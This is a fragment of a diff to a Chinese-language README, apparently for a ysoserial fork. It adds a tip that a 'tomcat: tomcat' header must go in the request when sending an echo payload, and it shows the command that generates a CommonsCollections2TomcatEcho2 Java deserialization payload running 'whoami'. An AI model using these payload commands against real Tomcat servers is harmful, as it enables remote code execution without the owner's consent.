@@ -17,7 +17,7 @@
 mvn package -DskipTests
 ```
 
-生成回显payload
+生成回显payload，打回显的payload时记得要在request添加上 tomcat: tomcat
 
 ```
 java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections2TomcatEcho2 "whoami"
